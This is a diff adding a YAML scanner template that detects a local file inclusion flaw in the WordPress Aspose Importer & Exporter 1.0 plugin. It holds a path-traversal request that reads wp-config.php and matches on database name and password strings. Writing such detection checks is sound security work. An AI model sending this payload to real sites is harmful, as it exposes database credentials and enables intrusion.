@@ -1,0 +1,33 @@
+id: "aspose-ie-file-download"
+name: "WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion"
+severity: "high"
+description: "WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion."
+tech:
+  - "wordpress"
+  - "php"
+tags:
+  - "aspose"
+  - "packetstorm"
+  - "wordpress"
+  - "wp-plugin"
+  - "lfi"
+  - "vuln"
+reference: "https://packetstormsecurity.com/files/131162/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "DB_NAME"
+      - "DB_PASSWORD"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
